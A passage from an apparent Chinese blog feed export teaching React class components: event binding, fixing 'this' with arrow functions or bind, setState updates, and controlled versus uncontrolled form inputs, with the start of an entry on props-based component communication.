class="keyword">this</span>.state.count&#125;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div&gt;</span></span><br><span class="line"><span class="regexp">          &lt;a href="http:/</span><span class="regexp">/www.iyouhun.com" onClick=&#123;this.handleClick&#125;&gt;</span></span><br><span class="line"><span class="regexp">            按钮</span></span><br><span class="line"><span class="regexp">          &lt;/</span>a&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure><p> <strong>总结：</strong></p><ul><li>绑定事件的方式和原生的方式一致，使用 <code>on+事件名称={处理函数}</code> 方式绑定</li><li>事件名称使用<code>大驼峰</code>规则，例如：<code>onClick</code> <code>onMouseEnter</code> , 处理函数默认传参为事件对象。</li></ul><h3 id="事件绑定this指向"><a href="#事件绑定this指向" class="headerlink" title="事件绑定this指向"></a>事件绑定this指向</h3><ul><li>在事件处理函数中打印 <code>this.state.count</code> 发现报错，<code>this</code> 是个<code>undefined</code>。</li><li>演示函数调用对 <code>this</code> 指向的影响，得出函数谁调用 <code>this</code> 就执行谁。</li><li>找出原因：处理函数不是通过组件去调用的，导致出现 <code>this</code> 不是组件问题。</li></ul><h4 id="1-发现this是undefined"><a href="#1-发现this是undefined" class="headerlink" title="1.发现this是undefined"></a>1.发现this是undefined</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 事件处理函数</span></span><br><span class="line">  handleClick(e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e);</span><br><span class="line">    <span class="comment">// Uncaught TypeError: Cannot read properties of undefined (reading 'state')</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.state.count);</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;div&gt;计数器：&#123;<span class="keyword">this</span>.state.count&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div&gt;</span></span><br><span class="line"><span class="regexp">          &lt;button onClick=&#123;this.handleClick&#125;&gt;按钮&lt;/</span>button&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure><h4 id="2-演示处理函数调用对-this-的影响"><a href="#2-演示处理函数调用对-this-的影响" class="headerlink" title="2.演示处理函数调用对 this 的影响"></a>2.演示处理函数调用对 this 的影响</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  name: <span class="string">'tom'</span>,</span><br><span class="line">  say() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line">obj.say(); <span class="comment">// 打印：&#123;name: 'tom', say: function&#125;</span></span><br><span class="line"><span class="keyword">const</span> say = obj.say;</span><br><span class="line">say(); <span class="comment">// 打印：window对象  严格模式</span></span><br></pre></td></tr></table></figure><h4 id="3-问题原因"><a href="#3-问题原因" class="headerlink" title="3.问题原因"></a>3.问题原因</h4><ul><li>类组件声明的处理函数，赋值给 <code>on+事件名称</code> 属性，调用的时候不是通过组件调用的。</li></ul><h3 id="处理-this-指向问题"><a href="#处理-this-指向问题" class="headerlink" title="处理 this 指向问题"></a>处理 this 指向问题</h3><ul><li>通过绑定箭头函数解决 this 问题</li><li>通过 bind 解决 this 问题</li><li>通过声明箭头函数解决 this 问题</li></ul><h4 id="1-通过绑定箭头函数解决-this-问题"><a href="#1-通过绑定箭头函数解决-this-问题" class="headerlink" title="1.通过绑定箭头函数解决 this 问题"></a>1.通过绑定箭头函数解决 this 问题</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 事件处理函数</span></span><br><span class="line">  handleClick(e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.state.count)</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;div&gt;计数器：&#123;<span class="keyword">this</span>.state.count&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div&gt;</span></span><br><span class="line"><span class="regexp">+          &lt;button onClick=&#123;(e)=&gt;this.handleClick(e)&#125;&gt;按钮&lt;/</span>button&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure><h4 id="2-通过-bind-解决-this-问题"><a href="#2-通过-bind-解决-this-问题" class="headerlink" title="2.通过 bind 解决 this 问题"></a>2.通过 bind 解决 this 问题</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 事件处理函数</span></span><br><span class="line">  handleClick(e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.state.count)</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;div&gt;计数器：&#123;<span class="keyword">this</span>.state.count&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div&gt;</span></span><br><span class="line"><span class="regexp">+          &lt;button onClick=&#123;this.handleClick.bind(this)&#125;&gt;按钮&lt;/</span>button&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure><h4 id="3-通过声明箭头函数解决-this-问题-推荐"><a href="#3-通过声明箭头函数解决-this-问题-推荐" class="headerlink" title="3.通过声明箭头函数解决 this 问题(推荐)"></a>3.通过声明箭头函数解决 this 问题(推荐)</h4><p>利用箭头函数形式的class实例方法。</p><p>注意：该语法是实验性语法，但是，由于babel的存在可以直接使用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 事件处理函数</span></span><br><span class="line">+  handleClick = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.state.count)</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;div&gt;计数器：&#123;<span class="keyword">this</span>.state.count&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div&gt;</span></span><br><span class="line"><span class="regexp">          &lt;button onClick=&#123;this.handleClick&#125;&gt;按钮&lt;/</span>button&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure><h2 id="类组件-setState-使用"><a href="#类组件-setState-使用" class="headerlink" title="类组件 - setState 使用"></a>类组件 - setState 使用</h2><ul><li>React 类组件提供一个函数<code>setState({需修改数据})</code>，可以更新数据和视图。</li><li>直接修改 state 中的数据是不会更新视图，演示简单数据，数组，对象的正确修改方式。</li></ul><h4 id="1-通过setState的来修改数据更新视图"><a href="#1-通过setState的来修改数据更新视图" class="headerlink" title="1.通过setState的来修改数据更新视图"></a>1.通过setState的来修改数据更新视图</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  handleClick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 修改数据</span></span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      <span class="comment">// key是要修改的数据名称，value是对应的新值</span></span><br><span class="line">      count: <span class="keyword">this</span>.state.count + <span class="number">1</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;div&gt;计数器：&#123;<span class="keyword">this</span>.state.count&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div&gt;</span></span><br><span class="line"><span class="regexp">          &lt;button onClick=&#123;this.handleClick&#125;&gt;按钮&lt;/</span>button&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure><h4 id="2-修改数组和修改对象的正确姿势"><a href="#2-修改数组和修改对象的正确姿势" class="headerlink" title="2.修改数组和修改对象的正确姿势"></a>2.修改数组和修改对象的正确姿势</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span>,</span><br><span class="line">    user: &#123;</span><br><span class="line">      name: <span class="string">'jack'</span>,</span><br><span class="line">      age: <span class="number">18</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    list: [<span class="string">'电脑'</span>, <span class="string">'手机'</span>],</span><br><span class="line">  &#125;;</span><br><span class="line">  handleClick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 修改数据</span></span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      <span class="comment">// key是要修改的数据名称，value是对应的新值</span></span><br><span class="line">      count: <span class="keyword">this</span>.state.count + <span class="number">1</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">  updateList = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 修改列表</span></span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      list: [...this.state.list, <span class="string">'相机'</span>],</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">  updateUser = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 修改对象</span></span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      user: &#123;</span><br><span class="line">        ...this.state.user,</span><br><span class="line">        name: <span class="string">'tony'</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;div&gt;计数器：&#123;<span class="keyword">this</span>.state.count&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div&gt;</span></span><br><span class="line"><span class="regexp">          &lt;button onClick=&#123;this.handleClick&#125;&gt;按钮&lt;/</span>button&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;hr /</span>&gt;</span><br><span class="line">        &lt;div&gt;商品：&#123;<span class="keyword">this</span>.state.list.join(<span class="string">','</span>)&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;button onClick=&#123;this.updateList&#125;&gt;改数组&lt;/</span>button&gt;</span><br><span class="line">        &lt;hr /&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">          姓名：&#123;<span class="keyword">this</span>.state.user.name&#125;，年龄：&#123;<span class="keyword">this</span>.state.user.age&#125;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;button onClick=&#123;this.updateUser&#125;&gt;改对象&lt;/</span>button&gt;</span><br><span class="line">      &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">export default App;</span></span><br></pre></td></tr></table></figure><h2 id="类组件-受控组件"><a href="#类组件-受控组件" class="headerlink" title="类组件 - 受控组件"></a>类组件 - 受控组件</h2><p><strong>1.什么是受控组件</strong></p><ul><li><p>表单元素的值被 React 中<code>state</code>控制，这个表单元素就是受控组件。</p><p><strong>2.如何绑定表单元素，如：<code>input:text</code> <code>input:checkbox</code></strong></p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    mobile: <span class="string">'13811112222'</span>,</span><br><span class="line">    isAgree: <span class="literal">true</span>,</span><br><span class="line">  &#125;;</span><br><span class="line"> </span><br><span class="line">  changeMobile = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      mobile: e.target.value,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line"> </span><br><span class="line">  changeAgree = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      isAgree: e.target.checked,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line"> </span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">          &lt;input</span><br><span class="line">            value=&#123;<span class="keyword">this</span>.state.mobile&#125;</span><br><span class="line">            onChange=&#123;<span class="keyword">this</span>.changeMobile&#125;</span><br><span class="line">            type=<span class="string">"text"</span></span><br><span class="line">            placeholder=<span class="string">"请输入手机号"</span></span><br><span class="line">          /&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div&gt;</span></span><br><span class="line"><span class="regexp">          &lt;input</span></span><br><span class="line"><span class="regexp">            checked=&#123;this.state.isAgree&#125;</span></span><br><span class="line"><span class="regexp">            onChange=&#123;this.changeAgree&#125;</span></span><br><span class="line"><span class="regexp">            type="checkbox"</span></span><br><span class="line"><span class="regexp">          /</span>&gt;</span><br><span class="line">          同意用户协议和隐私条款</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li>使用<code>state</code>的数据赋值给表单原生，通过<code>onChange</code>监听值改变修改 state 数据，完成表单元素的绑定。</li><li>这种表单元素称为受控组件。</li></ul><h2 id="类组件-非受控组件"><a href="#类组件-非受控组件" class="headerlink" title="类组件 - 非受控组件"></a>类组件 - 非受控组件</h2><p><strong>1.什么是非受控组件？</strong></p><ul><li>没有通过 state 控制的表单元素，它自己控制自身的值，就是非受控组件</li></ul><p><strong>2.通过 ref 获取表单元素获取非受控组件的值</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component, createRef &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 获取非受控组件的值</span></span><br><span class="line">  <span class="comment">// 1. 通过createRef创建一个ref对象</span></span><br><span class="line">  <span class="comment">// 2. 给元素绑定ref属性值为创建的ref对象</span></span><br><span class="line">  <span class="comment">// 3. 通过ref对象的current获取元素，再获取它的值</span></span><br><span class="line">  mobileRef = createRef();</span><br><span class="line"> </span><br><span class="line">  getMobile = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.mobileRef.current.value);</span><br><span class="line">  &#125;;</span><br><span class="line"> </span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">          &#123;<span class="comment">/* 没有被state控制的表单原生认为是非受控组件 */</span>&#125;</span><br><span class="line">          &lt;input ref=&#123;<span class="keyword">this</span>.mobileRef&#125; type=<span class="string">"text"</span> placeholder=<span class="string">"请输入手机号"</span> /&gt;</span><br><span class="line">          &lt;button onClick=&#123;<span class="keyword">this</span>.getMobile&#125;&gt;获取&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>div&gt;</span><br><span class="line">      &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">export default App;</span></span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li><code>ref</code> 的作用：获取DOM或组件</li><li>借助于<code>ref</code>，使用原生 DOM方式来获取表单元素值。</li></ul><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>1．组件的两种创建方式:函数组件和类组件 </p><p>2．无状态(函数)组件，负责静态结构展示 </p><p>3．有状态(类）组件，负责更新UI，让页面动起来 </p><p>4．绑定事件注意this指向问题 </p><p>5．推荐使用受控组件来处理表单 </p><p>6．完全利用JS语言的能力创建组件，这是 React的思想</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;React-组件介绍&quot;&gt;&lt;a href=&quot;#React-组件介绍&quot; class=&quot;headerlink&quot; title=&quot;React 组件介绍&quot;&gt;&lt;/a&gt;React 组件介绍&lt;/h2&gt;&lt;p&gt;组件允许你将 UI 拆分为&lt;strong&gt;独立可复用&lt;/strong&gt;的代码
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="React" scheme="//www.shen.ee/tags/React/"/>
    
      <category term="React组件" scheme="//www.shen.ee/tags/React%E7%BB%84%E4%BB%B6/"/>
    
      <category term="React组件基础" scheme="//www.shen.ee/tags/React%E7%BB%84%E4%BB%B6%E5%9F%BA%E7%A1%80/"/>
    
      <category term="React定义组件" scheme="//www.shen.ee/tags/React%E5%AE%9A%E4%B9%89%E7%BB%84%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>React组件通讯</title>
    <link href="//www.shen.ee/article/50340.html"/>
    <id>//www.shen.ee/article/50340.html</id>
    <published>2022-06-15T02:38:39.000Z</published>
    <updated>2022-06-22T06:24:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="组件通讯-概念"><a href="#组件通讯-概念" class="headerlink" title="组件通讯-概念"></a>组件通讯-概念</h2><blockquote><p>组件状态是独立的，组件化之后涉及状态同步，需要进行组件通讯</p></blockquote><h3 id="组件的特点"><a href="#组件的特点" class="headerlink" title="组件的特点"></a>组件的特点</h3><ul><li>组件是<strong><code>独立且封闭</code></strong>的单元，默认情况下，只能使用组件自己的数据</li><li>在组件化过程中，通常会将一个完整的功能拆分成多个组件，以更好的完成整个应用的功能</li></ul><h3 id="组件通讯意义"><a href="#组件通讯意义" class="headerlink" title="组件通讯意义"></a>组件通讯意义</h3><ul><li>而在这个过程中，多个组件之间不可避免的要<code>共享</code>某些数据</li><li>为了实现这些功能，就需要打破组件的独立封闭性，让其与外界沟通</li><li>这个过程就是<strong>组件通讯</strong></li></ul><h2 id="props-基本使用"><a href="#props-基本使用" class="headerlink" title="props 基本使用"></a>props 基本使用</h2><h3 id="传递数据和接收数据的过程"><a href="#传递数据和接收数据的过程" class="headerlink" title="传递数据和接收数据的过程"></a>传递数据和接收数据的过程</h3><ul><li>使用组件的时候通过属性绑定数据，在组件内部通过 props 获取即可。</li></ul><h3 id="函数组件使用-props"><a href="#函数组件使用-props" class="headerlink" title="函数组件使用 props"></a>函数组件使用 props</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 使用组件</span><br><span class="line"><span class="tag">&lt;<span class="name">Hello</span> <span class="attr">name</span>=<span class="string">"jack"</span> <span class="attr">age</span>=<span class="string">"20"</span> /&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight 